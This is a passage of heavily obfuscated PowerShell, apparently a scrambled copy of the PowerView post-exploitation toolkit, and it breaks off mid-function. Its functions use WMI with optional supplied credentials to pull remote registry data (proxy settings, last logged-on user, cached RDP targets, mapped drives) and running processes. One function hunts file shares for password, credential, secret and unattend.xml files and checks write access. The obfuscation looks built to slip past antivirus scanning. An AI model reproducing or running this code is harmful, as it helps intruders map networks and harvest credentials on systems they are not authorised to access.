                ${AU`T`oCO`N`FIgurL} = ${rE`gP`R`ovIdER}.("{1}{2}{0}"-f 'Value','Get','String').Invoke(${h`kcU}, ${K`eY}, ("{1}{0}{2}"-f 'n','AutoCo','figURL'))."sVa`lUe"

                ${w`pAD} = ''
                if (${aU`TOCON`FiGURL} -and (${AUt`ocon`FiGurL} -ne '')) {
                    try {
                        ${W`PaD} = (&("{2}{1}{0}" -f 'ject','-Ob','New') ("{2}{1}{0}{3}"-f't.WebClien','e','N','t')).("{0}{1}{2}{3}{4}"-f 'Dow','n','l','oa','dString').Invoke(${Au`TOcOnfIG`U`Rl})
                    }
                    catch {
                        &("{2}{0}{3}{1}"-f '-','arning','Write','W') ('[Get-W'+'MI'+'RegProx'+'y] '+'Er'+'ror'+' '+'c'+'onn'+'ecting '+'t'+'o '+'Au'+'toConfig'+'U'+'RL'+' '+': '+"$AutoConfigURL")
                    }
                }

                if (${P`R`OXYSeR`Ver} -or ${aUToc`OnfI`g`UrL}) {
                    ${o`UT} = &("{1}{2}{0}"-f'ct','New-Obj','e') ("{0}{2}{1}" -f 'PS','ect','Obj')
                    ${o`UT} | &("{1}{0}{3}{2}"-f'Mem','Add-','r','be') ("{2}{3}{1}{0}" -f 'perty','ro','N','otep') ("{1}{0}{2}" -f'Nam','Computer','e') ${COmp`UtER}
                    ${O`Ut} | &("{0}{2}{1}" -f 'Add-M','er','emb') ("{1}{0}{2}"-f 'ert','Noteprop','y') ("{0}{2}{1}{3}" -f'P','xyServ','ro','er') ${P`R`oXyS`ErVer}
                    ${o`Ut} | &("{1}{0}{3}{2}" -f'dd-M','A','r','embe') ("{1}{2}{0}" -f 'ty','Noteprop','er') ("{3}{1}{0}{2}"-f 'on','toC','figURL','Au') ${A`Ut`OCoNf`IGu`Rl}
                    ${O`UT} | &("{2}{0}{1}" -f'd','d-Member','A') ("{1}{3}{2}{0}" -f 'operty','N','epr','ot') ("{1}{0}" -f'd','Wpa') ${wp`Ad}
                    ${o`UT}."PsoBjE`ct"."tYP`e`N`AmEs".("{0}{1}{2}"-f'In','s','ert').Invoke(0, ("{2}{0}{4}{1}{5}{3}"-f 'Pro','t','PowerView.','gs','xySet','in'))
                    ${o`UT}
                }
                else {
                    &("{0}{1}{3}{2}"-f 'Writ','e','ing','-Warn') ('[Ge'+'t-WM'+'IReg'+'P'+'r'+'oxy] '+'No'+' '+'pro'+'xy'+' '+'s'+'etti'+'ngs '+'found'+' '+'for'+' '+"$ComputerName")
                }
            }
            catch {
                &("{0}{1}{2}" -f 'Wr','ite-Warnin','g') ('[G'+'et-'+'WMIR'+'egProxy]'+' '+'Error'+' '+'e'+'numerati'+'ng '+'proxy'+' '+'se'+'tting'+'s '+'for'+' '+"$ComputerName "+': '+"$_")
            }
        }
    }
}


function G`ET-WMIr`eG`LAsTL`og`Ge`DOn {


    [OutputType({"{3}{7}{4}{1}{5}{2}{0}{6}"-f'OnUse','s','gged','Pow','.La','tLo','r','erView'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItIon = 0, ValueFROmPIPElIne = ${T`RUE}, vaLUefRoMPIpEliNEbyPROPErtYnAMe = ${Tr`Ue})]
        [Alias({"{0}{2}{1}" -f'H','Name','ost'}, {"{0}{1}{2}" -f 'dnshost','n','ame'}, {"{0}{1}" -f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COmPutE`RN`AMe} = ("{0}{2}{1}" -f 'l','calhost','o'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eDe`NT`iaL} =  (VARIaBlE ("21"+"gV7E")  -valuEoNl  )::"emP`Ty"
    )

    PROCESS {
        ForEach (${COMp`UTer} in ${COm`P`UterNaMe}) {
            
            ${hk`lM} = 2147483650

            ${wmi`A`RgUm`en`Ts} = @{
                ("{1}{0}" -f'st','Li') = ${tR`UE}
                ("{1}{0}" -f'ss','Cla') = ("{0}{1}{3}{2}" -f'StdRe','g','ov','Pr')
                ("{1}{2}{0}"-f 'ce','Namesp','a') = ((("{4}{2}{0}{1}{3}"-f 'W','ode','otD','fault','ro'))  -rePlAcE  ([CHaR]68+[CHaR]87+[CHaR]111),[CHaR]92)
                ("{0}{1}{2}" -f 'Computer','na','me') = ${C`O`mPUTEr}
                ("{2}{1}{0}"-f 'rAction','ro','Er') = ("{3}{0}{2}{1}" -f'ont','nue','i','SilentlyC')
            }
            if (${p`sBo`UNdPA`RaMet`E`Rs}[("{1}{2}{3}{0}"-f 'al','C','r','edenti')]) { ${W`MIA`RgumE`Nts}[("{2}{1}{0}"-f'dential','e','Cr')] = ${c`REdEn`Ti`AL} }

            
            try {
                ${r`eg} = &("{0}{1}{3}{2}" -f 'Get-','WmiO','ect','bj') @WmiArguments

                ${K`eY} = ((("{6}{5}{4}{0}{3}{2}{9}{8}{7}{1}{10}"-f'crosoftRGzW','og','owsRGz','ind','zMi','ERG','SOFTWAR','ticationRGzL','RGzAuthen','CurrentVersion','onUI'))."R`e`PlacE"(([CHAr]82+[CHAr]71+[CHAr]122),[sTRing][CHAr]92))
                ${VAl`UE} = ("{0}{4}{3}{2}{1}"-f 'Las','r','edOnUse','g','tLog')
                ${lAST`UseR} = ${r`eg}.("{2}{0}{4}{1}{3}" -f 'tr','gV','GetS','alue','in').Invoke(${h`kLM}, ${k`ey}, ${vA`LUE})."s`VA`Lue"

                ${la`sTLogged`On} = &("{1}{2}{0}"-f'bject','New','-O') ("{0}{1}{2}"-f'PSO','bjec','t')
                ${l`A`s`TlOg`gEDOn} | &("{0}{1}{2}" -f'Add-Me','m','ber') ("{2}{1}{0}" -f'perty','tepro','No') ("{2}{0}{3}{1}"-f'er','ame','Comput','N') ${c`oM`p`UteR}
                ${lA`st`loggE`DoN} | &("{2}{0}{1}"-f'dd-Me','mber','A') ("{1}{2}{0}" -f 'operty','N','otepr') ("{1}{2}{0}" -f 'On','LastL','ogged') ${LAs`TUSer}
                ${lAs`TLO`ggeDoN}."PsoB`j`Ect"."tYpeNaM`eS".("{2}{0}{1}"-f'ns','ert','I').Invoke(0, ("{4}{7}{6}{1}{0}{3}{2}{5}"-f'La','w.','gedOnU','stLog','P','ser','Vie','ower'))
                ${lA`s`TLoG`GedON}
            }
            catch {
                &("{0}{1}{2}" -f'Wr','ite-W','arning') ('[Get'+'-WMIR'+'e'+'gLastLog'+'ged'+'On'+'] '+'Er'+'ror '+'openin'+'g '+'remot'+'e'+' '+'regi'+'stry'+' '+'on'+' '+"$Computer. "+'R'+'emote '+'r'+'egistry '+'li'+'kel'+'y '+'no'+'t '+'e'+'nable'+'d.')
            }
        }
    }
}


function ge`T`-`WMiRegca`chE`dR`dpc`ONneCtIoN {


    [OutputType({"{6}{1}{2}{5}{4}{3}{0}" -f'PConnection','erV','iew.','D','R','Cached','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSiTIOn = 0, vALuEfrOMpipElINE = ${TR`UE}, ValUEFrOmpiPelinEbypropertYnAmE = ${TR`UE})]
        [Alias({"{0}{1}"-f'HostN','ame'}, {"{2}{1}{0}"-f'e','ostnam','dnsh'}, {"{1}{0}" -f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${COMPU`T`e`RNaME} = ("{1}{0}{2}"-f'os','localh','t'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Re`DeNTIAL} =   $21gv7E::"eM`pTy"
    )

    PROCESS {
        ForEach (${c`Omp`Ut`eR} in ${co`m`PUtER`NAmE}) {
            
            ${h`Ku} = 2147483651

            ${WM`I`ARGUmEN`Ts} = @{
                ("{0}{1}" -f'Li','st') = ${TR`Ue}
                ("{1}{0}"-f'lass','C') = ("{2}{1}{0}" -f'v','Pro','StdReg')
                ("{0}{1}"-f 'Namespa','ce') = ((("{2}{0}{3}{1}" -f'L','lt','rootc','Edefau')) -RePLaCE ([chAr]99+[chAr]76+[chAr]69),[chAr]92)
                ("{0}{2}{3}{1}" -f 'Comput','e','er','nam') = ${CO`M`PuTER}
                ("{2}{1}{0}"-f 'rAction','rro','E') = ("{0}{1}"-f 'St','op')
            }
            if (${pS`BOU`N`DpaRAMeT`ERS}[("{0}{2}{1}" -f'Cre','al','denti')]) { ${wMia`RgumEN`Ts}[("{1}{2}{0}"-f'al','Cred','enti')] = ${CRED`En`T`iaL} }

            try {
                ${r`eg} = &("{1}{2}{3}{0}"-f'ect','Get-W','miO','bj') @WmiArguments

                
                ${U`S`ERSiDs} = (${R`EG}.("{0}{1}" -f'EnumKe','y').Invoke(${H`KU}, ''))."S`NAMeS" | &("{2}{1}{0}"-f 'Object','here-','W') { ${_} -match (('S-1-5-2'+'1-[0-9]'+'+-[0-9]+'+'-'+'[0-'+'9'+']+-[0'+'-'+'9'+']+{'+'0'+'}')  -f[ChAR]36) }

                ForEach (${use`R`siD} in ${u`sEr`SiDS}) {
                    try {
                        if (${P`SbounD`pA`RAmET`ERS}[("{3}{1}{0}{2}" -f 'ent','red','ial','C')]) {
                            ${uSErn`AME} = &("{3}{1}{2}{0}"-f'SID','rtFrom','-','Conve') -ObjectSid ${USe`RsiD} -Credential ${C`Rede`NtIAl}
                        }
                        else {
                            ${U`s`ErNa`ME} = &("{2}{0}{1}" -f 'ertFrom-S','ID','Conv') -ObjectSid ${U`seR`sid}
                        }

                        
                        ${C`OnnEc`Ti`oN`KEYs} = ${R`Eg}.("{1}{0}{2}"-f'numValue','E','s').Invoke(${H`Ku},("$UserSID\Software\Microsoft\Terminal "+'S'+'e'+'rver '+('C'+'lient{0}D'+'ef'+'ault')-f[CHAR]92))."SN`AmES"

                        ForEach (${CON`N`eCTioN} in ${con`N`EcTI`onkEYS}) {
                            
                            if (${CoN`NeCT`i`ON} -match ("{0}{1}" -f 'MRU.','*')) {
                                ${TArGE`TSe`Rver} = ${R`eG}.("{3}{2}{1}{0}{4}" -f 'al','gV','Strin','Get','ue').Invoke(${h`ku}, ("$UserSID\Software\Microsoft\Terminal "+'Serve'+'r'+' '+('C'+'lientM'+'91Defaul'+'t')."RE`PlACE"(([Char]77+[Char]57+[Char]49),'\')), ${cON`NE`c`TIoN})."sV`AlUe"

                                ${f`ouNDC`ON`N`Ecti`On} = &("{1}{0}{2}" -f'Obje','New-','ct') ("{1}{2}{0}"-f't','PSOb','jec')
                                ${f`OunDc`Onn`eCt`ION} | &("{2}{0}{3}{1}"-f'd-Me','r','Ad','mbe') ("{0}{1}{2}{3}" -f'N','o','teproper','ty') ("{0}{1}{2}{3}" -f'C','o','m','puterName') ${c`oMput`er}
                                ${fOUND`c`oNN`ecti`On} | &("{1}{0}{2}" -f'd-M','Ad','ember') ("{2}{3}{1}{0}" -f'perty','o','Notep','r') ("{0}{2}{1}"-f 'User','me','Na') ${UsE`RN`AmE}
                                ${FOUN`DC`oNNE`c`TIoN} | &("{2}{0}{1}"-f 'M','ember','Add-') ("{0}{1}{2}"-f'N','ote','property') ("{0}{1}" -f 'UserS','ID') ${u`seRS`Id}
                                ${fOun`DCO`NN`EC`TIon} | &("{2}{1}{0}" -f 'r','mbe','Add-Me') ("{0}{1}{2}" -f 'Notep','ropert','y') ("{1}{0}{2}" -f 'e','TargetS','rver') ${TA`RgE`TsER`V`Er}
                                ${founDC`oN`NE`CTION} | &("{1}{2}{0}" -f 'r','Add','-Membe') ("{0}{3}{1}{2}"-f'Notep','rt','y','rope') ("{0}{1}{2}{3}" -f'Use','rn','am','eHint') ${nu`Ll}
                                ${Fo`UNDC`on`NeCtIoN}."P`SoBJEcT"."Ty`pE`NA`MES".("{0}{1}" -f'In','sert').Invoke(0, ("{3}{2}{5}{1}{4}{0}" -f 'ion','che','View','Power','dRDPConnect','.Ca'))
                                ${FoUn`d`co`NnEC`TIon}
                            }
                        }

                        
                        ${S`ErVeR`ke`ys} = ${r`Eg}.("{1}{0}{2}"-f 'Ke','Enum','y').Invoke(${H`Ku},("$UserSID\Software\Microsoft\Terminal "+'S'+'erver '+('Client6h'+'rS'+'e'+'rve'+'rs')."rE`P`LACe"('6hr',[STRinG][CHar]92)))."sn`Am`Es"

                        ForEach (${seR`VEr} in ${sER`Ve`Rk`Eys}) {

                            ${us`ER`N`AmeH`iNT} = ${r`EG}.("{3}{1}{0}{2}"-f'l','a','ue','GetStringV').Invoke(${H`Ku}, ("$UserSID\Software\Microsoft\Terminal "+'S'+'erver '+"Client\Servers\$Server"), ("{0}{2}{1}" -f'Userna','eHint','m'))."S`V`ALue"

                            ${FounDCo`NNeC`TioN} = &("{0}{1}{2}"-f 'New-','O','bject') ("{1}{2}{0}"-f 't','PSOb','jec')
                            ${f`oun`DConNEc`Ti`oN} | &("{2}{0}{3}{1}"-f'M','r','Add-','embe') ("{1}{2}{3}{0}"-f'ty','Not','eprop','er') ("{1}{0}{2}" -f 'er','Comput','Name') ${C`omPUT`Er}
                            ${F`O`UndCOnNeCt`ION} | &("{0}{1}{2}" -f'Add-M','em','ber') ("{2}{3}{1}{0}"-f'ty','oper','N','otepr') ("{1}{0}{2}"-f'se','U','rName') ${U`SErNa`mE}
                            ${f`O`UNDcONNec`TIOn} | &("{2}{0}{1}"-f'-Me','mber','Add') ("{1}{2}{0}" -f 'roperty','Not','ep') ("{0}{1}"-f'U','serSID') ${uSeRs`ID}
                            ${f`oUND`C`On`NecTIon} | &("{0}{1}{2}" -f'A','dd-M','ember') ("{1}{0}{2}" -f'eproper','Not','ty') ("{0}{1}{2}"-f 'Ta','rgetSe','rver') ${sE`Rv`ER}
                            ${fo`UN`Dc`oNnEcTION} | &("{2}{0}{1}" -f 'em','ber','Add-M') ("{1}{2}{0}"-f 'erty','Notep','rop') ("{2}{0}{1}"-f 'ameH','int','Usern') ${U`sERn`AmEhI`NT}
                            ${Fo`UndCOn`Nec`TI`oN}."P`sOBje`cT"."t`yp`ENaMEs".("{0}{1}{2}"-f 'I','nse','rt').Invoke(0, ("{1}{4}{0}{3}{6}{2}{5}"-f'.','PowerVi','he','C','ew','dRDPConnection','ac'))
                            ${FOU`NDConNEct`i`oN}
                        }
                    }
                    catch {
                        &("{2}{3}{0}{1}" -f 'bo','se','Write-Ve','r') ('[Ge'+'t-WM'+'I'+'R'+'eg'+'Cached'+'RDPConnect'+'ion'+'] '+'Error'+': '+"$_")
                    }
                }
            }
            catch {
                &("{2}{0}{1}" -f 'te-','Warning','Wri') ('['+'G'+'e'+'t-WM'+'I'+'RegCachedRD'+'PCon'+'ne'+'ction] '+'Erro'+'r '+'acce'+'ssin'+'g '+"$Computer, "+'li'+'ke'+'ly '+'in'+'suff'+'icie'+'n'+'t '+'per'+'mi'+'ss'+'ions '+'or'+' '+'firew'+'all'+' '+'rule'+'s '+'o'+'n '+'ho'+'st: '+"$_")
            }
        }
    }
}


function ge`T-`wMIREGM`ouN`TeDDriVe {


    [OutputType({"{4}{0}{2}{1}{5}{6}{3}" -f 'erV','egM','iew.R','rive','Pow','ounte','dD'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, valuEFrOMpIPeliNe = ${T`RUE}, vALUEfROmPIPelinEBYpRoperTynaME = ${tr`UE})]
        [Alias({"{1}{0}{2}"-f 'stNa','Ho','me'}, {"{2}{0}{1}{3}"-f 'nsh','ost','d','name'}, {"{1}{0}"-f'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Co`mpu`TErn`AME} = ("{0}{1}" -f 'localh','ost'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REDent`I`Al} =   $21gV7e::"E`mptY"
    )

    PROCESS {
        ForEach (${CO`MPU`TEr} in ${CO`MP`UT`erNAmE}) {
            
            ${h`ku} = 2147483651

            ${WMI`Ar`gUm`e`Nts} = @{
                ("{1}{0}" -f'st','Li') = ${Tr`UE}
                ("{1}{0}" -f'ass','Cl') = ("{0}{1}{2}" -f 'St','dRegP','rov')
                ("{0}{2}{1}" -f'Name','pace','s') = ((("{0}{3}{1}{2}"-f'r','ot{0}defa','ult','o')) -f [ChaR]92)
                ("{2}{3}{0}{1}"-f'm','e','Com','puterna') = ${coMp`Ut`ER}
                ("{2}{0}{1}" -f 'orActio','n','Err') = ("{0}{1}"-f'S','top')
            }
            if (${psb`OUNd`PaR`AMeTE`RS}[("{1}{0}{2}"-f 'redenti','C','al')]) { ${wMia`Rgu`M`EntS}[("{2}{3}{1}{0}"-f 'al','nti','Cred','e')] = ${CrEde`NT`IAl} }

            try {
                ${R`eG} = &("{2}{1}{3}{0}"-f'ect','-W','Get','miObj') @WmiArguments

                
                ${U`sERS`I`ds} = (${r`eG}.("{0}{1}" -f'En','umKey').Invoke(${H`ku}, ''))."sN`Am`ES" | &("{3}{0}{2}{1}"-f 'ere-Obj','ct','e','Wh') { ${_} -match (('S-'+'1'+'-5'+'-21-'+'[0-'+'9]+-[0'+'-9'+']+-[0-9]'+'+-['+'0-9'+']+Drp').("{1}{0}{2}" -f 'pLA','re','cE').Invoke('Drp','$')) }

                ForEach (${u`s`eRSid} in ${uS`eR`SiDs}) {
                    try {
                        if (${psbounDp`ArAM`E`TE`RS}[("{2}{3}{0}{1}" -f 'edentia','l','C','r')]) {
                            ${uS`er`N`AME} = &("{0}{3}{2}{1}"-f 'C','D','vertFrom-SI','on') -ObjectSid ${u`SErs`id} -Credential ${CrED`E`NTIaL}
                        }
                        else {
                            ${u`sEr`NaMe} = &("{2}{3}{1}{0}" -f '-SID','om','Conv','ertFr') -ObjectSid ${USE`R`sId}
                        }

                        ${DrIvEle`TT`E`Rs} = (${r`eg}.("{2}{0}{1}"-f 'um','Key','En').Invoke(${H`Ku}, "$UserSID\Network"))."Sna`m`eS"

                        ForEach (${DrI`VElett`Er} in ${dRiv`ELEt`T`ers}) {
                            ${p`Ro`ViderNaME} = ${r`eg}.("{3}{2}{1}{0}" -f'tringValue','S','et','G').Invoke(${H`ku}, "$UserSID\Network\$DriveLetter", ("{3}{1}{0}{2}"-f'a','erN','me','Provid'))."SV`A`lUE"
                            ${rE`motep`Ath} = ${R`Eg}.("{1}{2}{3}{0}"-f 'ue','GetStrin','gVa','l').Invoke(${H`Ku}, "$UserSID\Network\$DriveLetter", ("{1}{0}{2}{3}"-f'ote','Rem','P','ath'))."S`VaL`UE"
                            ${dRI`Ve`US`ErnAmE} = ${R`EG}.("{2}{0}{3}{1}"-f'Str','ngValue','Get','i').Invoke(${H`KU}, "$UserSID\Network\$DriveLetter", ("{1}{0}" -f 'serName','U'))."S`Va`LUe"
                            if (-not ${usE`R`NAmE}) { ${USer`N`A`Me} = '' }

                            if (${reMo`T`epAtH} -and (${reM`O`Tep`AtH} -ne '')) {
                                ${MOUnt`Eddr`IvE} = &("{0}{2}{1}" -f'New-O','ject','b') ("{1}{2}{0}"-f 'bject','P','SO')
                                ${m`ounTEDDR`ivE} | &("{2}{0}{1}" -f 'dd-Membe','r','A') ("{0}{2}{3}{1}"-f'Note','rty','pro','pe') ("{0}{1}{3}{2}" -f'Com','put','Name','er') ${com`PU`TeR}
                                ${M`o`UNtEDd`RIVE} | &("{2}{3}{0}{1}"-f'-M','ember','A','dd') ("{2}{0}{3}{1}"-f 'epro','y','Not','pert') ("{1}{2}{0}" -f 'ame','User','N') ${USeRN`A`ME}
                                ${mo`Unte`D`dr`Ive} | &("{1}{0}{2}" -f'dd-Mem','A','ber') ("{2}{1}{0}" -f 'perty','pro','Note') ("{0}{1}" -f'UserS','ID') ${u`s`eRsid}
                                ${mo`UNtE`d`dRive} | &("{0}{1}{2}" -f 'A','dd-Me','mber') ("{3}{2}{1}{0}" -f'perty','pro','te','No') ("{2}{1}{0}"-f'tter','veLe','Dri') ${DRiveL`eT`TER}
                                ${M`OunTEddR`i`Ve} | &("{2}{0}{1}" -f'dd-Membe','r','A') ("{1}{2}{0}{3}"-f 'oper','N','otepr','ty') ("{0}{3}{1}{2}" -f'Provi','Nam','e','der') ${prOVideR`Na`ME}
                                ${MOUnTED`d`RIve} | &("{2}{1}{0}"-f'ber','dd-Mem','A') ("{1}{0}{3}{2}"-f'otep','N','ty','roper') ("{2}{1}{0}" -f'th','a','RemoteP') ${remo`T`ep`ATh}
                                ${MoUnted`d`RiVE} | &("{1}{0}{2}"-f '-Mem','Add','ber') ("{3}{2}{0}{1}" -f'ert','y','eprop','Not') ("{1}{2}{0}"-f 'ame','DriveUse','rN') ${DrI`VEuse`R`NAme}
                                ${MOUN`Te`D`DRIvE}."PS`O`BJect"."t`yPEn`AmeS".("{2}{1}{0}" -f 'rt','se','In').Invoke(0, ("{3}{2}{4}{0}{1}" -f 'D','rive','iew.RegMou','PowerV','nted'))
                                ${mOUntED`DR`ivE}
                            }
                        }
                    }
                    catch {
                        &("{3}{2}{1}{0}" -f 'se','rbo','Ve','Write-') ('[G'+'et-WMIRegM'+'ount'+'edDri'+'ve] '+'Er'+'ror: '+"$_")
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f 'arning','Write-','W') ('['+'G'+'et-WMIRe'+'gM'+'oun'+'tedDrive] '+'Error'+' '+'acc'+'ess'+'ing '+"$Computer, "+'l'+'ikely'+' '+'insuff'+'i'+'ci'+'ent '+'p'+'ermissi'+'on'+'s '+'or'+' '+'fire'+'w'+'all '+'rul'+'e'+'s '+'on'+' '+'hos'+'t: '+"$_")
            }
        }
    }
}


function GeT-wmip`RoC`e`SS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{2}{1}{0}" -f'rocess','P','ld','hou','PSS'}, '')]
    [OutputType({"{0}{1}{5}{2}{3}{4}" -f 'Po','w','serProce','s','s','erView.U'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSitIOn = 0, valuEFROMpIpElIne = ${t`RuE}, VALuEFRoMPIpeLinEbypROpErtynaMe = ${t`RUe})]
        [Alias({"{1}{0}{2}"-f 'stN','Ho','ame'}, {"{2}{1}{0}" -f 'ame','tn','dnshos'}, {"{0}{1}"-f 'na','me'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOM`pUTe`Rn`Ame} = ("{0}{1}{2}"-f 'loca','l','host'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`EDEntIal} =  $21gV7e::"e`mPTY"
    )

    PROCESS {
        ForEach (${c`Ompu`TER} in ${COmpu`Te`RNA`me}) {
            try {
                ${WmiaRg`U`M`Ents} = @{
                    ("{2}{1}{0}"-f 'e','omputerNam','C') = ${CO`M`p`UteRname}
                    ("{1}{0}"-f'ass','Cl') = ("{0}{2}{1}"-f 'Win32','ocess','_pr')
                }
                if (${PSbo`UnDPAra`mE`TERs}[("{0}{1}{2}" -f'Cr','eden','tial')]) { ${WmI`Ar`gUM`eNTs}[("{2}{0}{1}" -f'denti','al','Cre')] = ${CrEdE`NT`iAL} }
                &("{2}{1}{0}"-f 'Iobject','M','Get-W') @WmiArguments | &("{3}{0}{2}{4}{1}" -f 'r','t','Each-Ob','Fo','jec') {
                    ${o`W`NeR} = ${_}.("{2}{1}{0}" -f 'er','wn','geto').Invoke();
                    ${pr`oC`ess} = &("{0}{1}{2}" -f 'New-Ob','jec','t') ("{2}{0}{1}"-f'e','ct','PSObj')
                    ${PR`oCe`sS} | &("{0}{2}{1}"-f'A','mber','dd-Me') ("{0}{3}{2}{1}" -f 'Noteprop','y','rt','e') ("{0}{1}{2}"-f'Compu','terN','ame') ${ComP`U`TER}
                    ${pro`C`Ess} | &("{0}{2}{1}" -f'Add-Me','er','mb') ("{0}{1}{2}"-f'Notep','rope','rty') ("{2}{1}{3}{0}"-f 'me','N','Process','a') ${_}."Pr`OcEsSn`Ame"
                    ${PrOc`e`sS} | &("{2}{0}{1}"-f'Membe','r','Add-') ("{1}{0}{3}{2}"-f 'otepro','N','rty','pe') ("{2}{0}{1}"-f'ocessI','D','Pr') ${_}."PROcE`s`sid"
                    ${PROc`e`SS} | &("{1}{2}{0}" -f 'r','Add-','Membe') ("{1}{0}{3}{2}"-f 'op','Notepr','rty','e') ("{1}{0}" -f 'omain','D') ${OwN`ER}."d`O`MaiN"
                    ${P`RocE`Ss} | &("{2}{1}{0}" -f 'ber','em','Add-M') ("{1}{0}{2}{3}" -f'ope','Notepr','rt','y') ("{0}{1}" -f 'U','ser') ${O`wnER}."u`seR"
                    ${p`RO`CESS}."Ps`oB`jEct"."T`ypEnAMEs".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{0}{4}{3}{1}{2}{5}"-f'PowerVie','rPro','ces','se','w.U','s'))
                    ${PROce`SS}
                }
            }
            catch {
                &("{2}{1}{0}"-f 'e','erbos','Write-V') ('[Get-WMIP'+'roce'+'s'+'s]'+' '+'Err'+'or '+'enum'+'era'+'t'+'ing '+'rem'+'o'+'te '+'pro'+'ce'+'sses '+'o'+'n '+"'$Computer', "+'a'+'ccess '+'lik'+'ely'+' '+'d'+'en'+'ied: '+"$_")
            }
        }
    }
}


function find`-iNt`EREST`iNGFI`Le {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{0}{1}"-f'ce','ss','PS','ShouldPro'}, '')]
    [OutputType({"{4}{1}{3}{2}{0}" -f 'dFile','werView','Foun','.','Po'})]
    [CmdletBinding(DefAuLtParAmETERSEtNAmE = {"{0}{4}{2}{3}{1}" -f 'Fil','ation','Spec','ific','e'})]
    Param(
        [Parameter(POsition = 0, VaLueFRomPIPelinE = ${TR`UE}, ValUeFrOmPipeLiNeBYPrOpertynAmE = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`AtH} = '.\',

        [Parameter(paRaMeTerSetnaMe = "f`iLeSPEciF`icAtI`On")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f 'rms','Se','archT','e'}, {"{0}{1}"-f 'T','erms'})]
        [String[]]
        ${in`c`luDE} = @(("{0}{1}{2}" -f'*','pass','word*'), ("{0}{2}{1}{3}" -f '*sens','tiv','i','e*'), ("{0}{1}" -f'*','admin*'), ("{1}{0}"-f'in*','*log'), ("{0}{1}" -f'*secret','*'), ("{3}{2}{0}{1}" -f 'nd*.xm','l','tte','una'), ("{0}{1}" -f'*.v','mdk'), ("{0}{1}{2}"-f '*c','reds','*'), ("{2}{1}{0}"-f'*','tial','*creden'), ("{2}{1}{0}"-f 'nfig','co','*.')),

        [Parameter(ParAMeteRseTNaMe = "F`i`lESPEC`iFic`Ati`on")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lA`S`T`AcCEsStI`ME},

        [Parameter(PaRameTeRsETNAME = "fiL`ESP`ECif`icA`TIoN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${lASt`wr`I`T`etiMe},

        [Parameter(pARamEteRseTname = "f`IL`e`sPECi`FI`caTiOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${CR`Eat`i`ONtIMe},

        [Parameter(PAraMeTersEtnaME = "o`F`FiceDOCs")]
        [Switch]
        ${o`F`F`IcEdocS},

        [Parameter(ParAMeterSetNAme = "FREs`HE`XEs")]
        [Switch]
        ${frE`s`hEXes},

        [Parameter(PArAmeTeRsEtnamE = "f`ILeSPECi`FIC`ATioN")]
        [Switch]
        ${E`xcLUDe`F`OlDeRS},

        [Parameter(PaRaMetERseTnaMe = "fILe`sPE`cI`F`iCatiON")]
        [Switch]
        ${E`X`Cl`UDEhI`dDeN},

        [Switch]
        ${c`He`ckWRitEAcCE`Ss},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`RE`deN`TIaL} =  $21gV7e::"Em`PTy"
    )

    BEGIN {
        ${seaRcHE`R`ARGum`e`N`Ts} =  @{
            ("{1}{0}"-f'ecurse','R') = ${T`RUe}
            ("{0}{2}{1}"-f'E','on','rrorActi') = ("{4}{0}{1}{3}{2}" -f'ent','l','nue','yConti','Sil')
            ("{2}{1}{0}" -f 'ude','l','Inc') = ${iN`cL`UdE}
        }
        if (${PSbou`N`dpaR`AmE`TERS}[("{2}{1}{0}" -f 'iceDocs','f','Of')]) {
            ${SeARcHe`RA`RGUm`E`NTs}[("{0}{1}" -f 'Incl','ude')] = @(("{0}{1}" -f'*','.doc'), ("{0}{1}"-f '*','.docx'), ("{0}{1}"-f '*.x','ls'), ("{1}{0}{2}" -f '.','*','xlsx'), ("{0}{1}" -f'*.','ppt'), ("{1}{0}{2}"-f '.','*','pptx'))
        }
        elseif (${P`S`BOu`Ndp`ARam`eteRS}[("{2}{0}{1}"-f'EX','Es','Fresh')]) {
            
            ${lA`S`Tacc`Es`sTIME} = (&("{2}{0}{1}"-f 'a','te','Get-D')).("{0}{1}" -f 'Ad','dDays').Invoke(-7).("{0}{2}{1}"-f'T','tring','oS').Invoke(("{1}{0}{2}"-f'M/dd/y','M','yyy'))
            ${s`EArch`ER`ARgu`M`EnTs}[("{1}{0}"-f 'lude','Inc')] = @(("{0}{1}" -f '*.','exe'))
        }
        ${sEarcHERA`Rg`Um`eNts}[("{1}{0}" -f'e','Forc')] = -not ${PSbO`UnDpA`RAmeTE`Rs}[("{1}{2}{0}{3}"-f'id','E','xcludeH','den')]

        ${MAp`P`e`DCOmPU`TeRS} = @{}

        function tE`St-wR`iTe {
            
            [CmdletBinding()]Param([String]${p`ATH})
            try {
                ${F`iLeT`est} =   (varIabLe  ('504'+'2'+'hB') -VaLUeO  )::("{1}{0}"-f 'ite','OpenWr').Invoke(${pa`TH})
                ${F`iLeTeSt}.("{1}{0}" -f'se','Clo').Invoke()
                ${tr`Ue}
            }
            catch {
                ${f`A`lsE}
            }
        }
    }

    PROCESS {
        ForEach (${ta`RG`etPA`TH} in ${p`Ath}) {
